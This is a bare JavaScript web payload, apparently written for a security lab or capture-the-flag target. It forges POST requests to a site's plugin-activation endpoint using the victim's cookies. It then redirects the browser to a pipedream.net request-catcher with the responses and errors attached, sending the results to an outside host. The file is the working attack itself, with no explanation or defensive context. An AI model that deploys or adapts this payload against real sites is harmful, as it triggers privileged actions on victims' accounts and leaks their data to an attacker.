var url = 'https://website-gafswq.inst.malicecyber.com/activate-plugin/1';
var r=''
var e=''
var headers = {
  'Cookie': document.cookie,
  

};

fetch(url, {
  method: 'POST',
  headers: headers
})
  .then(response => {
    // Process the response as needed
    r= response
    console.log('Response:', response);
    // Handle the response data, e.g., response.json(), response.text(), etc.
  })
  .catch(error => {
    e=error
    console.error('Error:', error);
  });



  var url = 'http://website-gafswq.inst.malicecyber.com/activate-plugin/1';

  var headers = {
    'Cookie': document.cookie,
    
  
  };
  
  fetch(url, {
    method: 'POST',
    headers: headers
  })
    .then(response => {
      // Process the response as needed
      document.location="https://enpw216ps367.x.pipedream.net/?="+response+r+e
      console.log('Response:', response);
      // Handle the response data, e.g., response.json(), response.text(), etc.
    })
    .catch(error => {
      document.location="https://enpw216ps367.x.pipedream.net/?="+error+e+r
      console.error('Error:', error);
    });
  




